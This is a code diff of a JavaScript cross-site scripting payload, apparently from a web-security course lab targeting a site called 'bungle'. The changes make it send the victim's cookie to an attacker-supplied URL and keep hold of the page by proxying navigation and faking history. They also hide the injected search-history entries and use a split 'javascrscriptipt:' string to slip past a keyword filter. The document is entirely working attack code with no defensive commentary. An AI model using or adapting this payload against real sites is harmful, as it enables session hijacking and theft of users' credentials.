@@ -4,12 +4,11 @@
 
 function payload(attacker) {
     function log(data) {
-        console.log($.param(data))
         $.get(attacker, data);
     }
     function proxy(href) {
         $("html").load(href, function(){
-            log(document.cookie);
+            log({cookie: document.cookie});
             window.history.pushState({page: 1}, "page 1", href);
             $("html").show();
             $("#bungle-lnk").attr("href", "./" + url);
@@ -20,8 +19,14 @@ function payload(attacker) {
                 });
             }
             else {
-                $("a:contains('<script>')").remove();
+                $("a:contains('function')").each(function() { $(this).remove(); });
                 $("#search-again-btn").attr("href", "./" + url);
+                $("a.history-item").each(function() {
+                    $(this).attr("href", "javascrscriptipt:void");
+                    $(this).click(function() {
+                        proxy("./search?q=" + $(this).text());
+                    });
+                });
             }
         });
     }
